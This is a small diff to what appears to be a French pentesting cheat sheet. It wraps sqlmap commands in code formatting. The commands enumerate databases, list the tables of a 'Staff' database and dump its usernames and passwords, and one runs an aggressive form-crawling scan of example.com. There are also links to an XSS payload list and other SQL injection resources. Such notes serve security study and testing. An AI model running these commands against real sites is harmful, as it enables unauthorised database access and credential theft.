@@ -45,11 +45,11 @@
   	- Outil automatique SQLMap --> https://github.com/DedSecCyber/DedSecSQL
 	- https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
 	- Avec burp copie de la requête POST (mettre la requête dans le fichier)
-		- sqlmap -r r.txt --batch --dbs
-		- sqlmap -r r.txt --batch -D Staff --tables
-		- sqlmap -r r.txt --batch -D Staff -T Users -C Username,Password --dump
+		- `sqlmap -r r.txt --batch --dbs`
+		- `sqlmap -r r.txt --batch -D Staff --tables`
+		- `sqlmap -r r.txt --batch -D Staff -T Users -C Username,Password --dump`
 
-	- sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+	- `sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3`
 
 
 - [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
